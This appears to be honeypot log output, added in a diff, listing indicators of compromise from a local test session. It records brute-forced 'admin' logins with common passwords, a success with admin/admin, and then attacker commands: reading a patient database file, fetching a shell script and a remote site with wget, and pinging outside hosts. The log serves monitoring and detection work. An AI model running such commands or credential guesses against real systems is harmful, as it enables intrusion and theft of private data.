@@ -1,0 +1,218 @@
+========== Indicators of Compromise ==========
+
+Session ID : 2469460adcd2
+Attacker IP: 192.168.211.1
+Username   : -
+Password   : -
+Status     : -
+Time       : 2026-07-10T11:13:45.674909Z
+------------------------------------------------------------========== Indicators of Compromise ==========
+
+Session ID : c926b31fe083
+Attacker IP: 192.168.211.1
+Username   : -
+Password   : -
+Status     : -
+Time       : 2026-07-10T11:20:11.629492Z
+------------------------------------------------------------
+Session ID : 81547ae03963
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : df
+Status     : Failed
+Time       : 2026-07-10T11:20:25.814672Z
+------------------------------------------------------------
+Session ID : 2ba89ba02bf2
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : sdfsdfs
+Status     : Failed
+Time       : 2026-07-10T11:20:25.822359Z
+------------------------------------------------------------
+Session ID : 8bd908ed1157
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : root
+Status     : Failed
+Time       : 2026-07-10T11:20:25.816901Z
+------------------------------------------------------------
+Session ID : 9910b6b80296
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : 
+Status     : Failed
+Time       : 2026-07-10T11:20:25.826906Z
+------------------------------------------------------------
+Session ID : 5567f0439bb9
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : administrator
+Status     : Failed
+Time       : 2026-07-10T11:20:25.818782Z
+------------------------------------------------------------
+Session ID : ce810f834b73
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : root@123
+Status     : Failed
+Time       : 2026-07-10T11:20:25.820711Z
+------------------------------------------------------------
+Session ID : 462a3167a841
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : admin@12345
+Status     : Failed
+Time       : 2026-07-10T11:20:25.838347Z
+------------------------------------------------------------
+Session ID : 863282ec4d39
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : fsdfsdf
+Status     : Failed
+Time       : 2026-07-10T11:20:25.840214Z
+------------------------------------------------------------
+Session ID : 7cc5f4f746d5
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : sdf
+Status     : Failed
+Time       : 2026-07-10T11:20:25.842412Z
+------------------------------------------------------------
+Session ID : 9f1a43f85b0a
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : sfdds
+Status     : Failed
+Time       : 2026-07-10T11:20:25.844023Z
+------------------------------------------------------------
+Session ID : 4466ec046dde
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : 123
+Status     : Failed
+Time       : 2026-07-10T11:20:25.845567Z
+------------------------------------------------------------
+Session ID : d05f02e6875b
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : admin
+Status     : Success
+Time       : 2026-07-10T11:20:24.865354Z
+------------------------------------------------------------
+Session ID : 621d8cda491f
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : admin@123
+Status     : Failed
+Time       : 2026-07-10T11:20:25.867114Z
+------------------------------------------------------------
+Session ID : 914213362aae
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : 12345
+Status     : Failed
+Time       : 2026-07-10T11:20:25.847533Z
+------------------------------------------------------------
+Session ID : f42028597a85
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : 1234
+Status     : Failed
+Time       : 2026-07-10T11:20:25.869308Z
+------------------------------------------------------------
+Session ID : 1e4746ff3e36
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : Admin@123
+Status     : Failed
+Time       : 2026-07-10T11:20:25.864616Z
+------------------------------------------------------------========== Indicators of Compromise ==========
+
+Session ID : 112c7ca695d3
+Attacker IP: 192.168.211.1
+Username   : admin
+Password   : admin
+Status     : Success
+Commands
+   - ls
+   - ls
+   - cd
+   - cat /opt/monitor/patients.db 
+Time       : 2026-07-10T11:21:58.106569Z
+------------------------------------------------------------========== Indicators of Compromise ==========
+
+Session ID : 112c7ca695d3
+Attacker IP: 192.168.211.1
+Username   : -
+Password   : -
+Status     : -
+Commands
+   - cd /
+   - cd /etc/
+   - ls
+Time       : 2026-07-10T11:22:04.498512Z
+------------------------------------------------------------========== Indicators of Compromise ==========
+
+Session ID : 112c7ca695d3
+Attacker IP: 192.168.211.1
+Username   : -
+Password   : -
+Status     : -
+Commands
+   - wget http://example.com/test.sh
+   - ls
+   - cd /home/
+   - ls
+   - cd admin/
+   - wget http://example.com/test.sh
+   - ls
+Time       : 2026-07-10T11:22:51.691295Z
+------------------------------------------------------------========== Indicators of Compromise ==========
+
+Session ID : 112c7ca695d3
+Attacker IP: 192.168.211.1
+Username   : -
+Password   : -
+Status     : -
+Commands
+   - ping google.com
+Time       : 2026-07-10T11:23:24.277673Z
+------------------------------------------------------------========== Indicators of Compromise ==========
+
+Session ID : 112c7ca695d3
+Attacker IP: 192.168.211.1
+Username   : -
+Password   : -
+Status     : -
+Commands
+   - ping dntds.shop
+Time       : 2026-07-10T11:25:03.297302Z
+------------------------------------------------------------========== Indicators of Compromise ==========
+
+Session ID : 112c7ca695d3
+Attacker IP: 192.168.211.1
+Username   : -
+Password   : -
+Status     : -
+Commands
+   - wget https://dntds.shop
+Time       : 2026-07-10T11:25:32.063776Z
+------------------------------------------------------------========== Indicators of Compromise ==========
+
+Session ID : 112c7ca695d3
+Attacker IP: 192.168.211.1
+Username   : -
+Password   : -
+Status     : -
+Commands
+   - ping 178.16.53.137
+Time       : 2026-07-10T11:26:06.313097Z
+------------------------------------------------------------========== Indicators of Compromise ==========
+
+Session ID : 112c7ca695d3
+Attacker IP: 192.168.211.1
+Username   : -
+Password   : -
+Status     : -
+Time       : 2026-07-10T11:26:42.088848Z
+------------------------------------------------------------
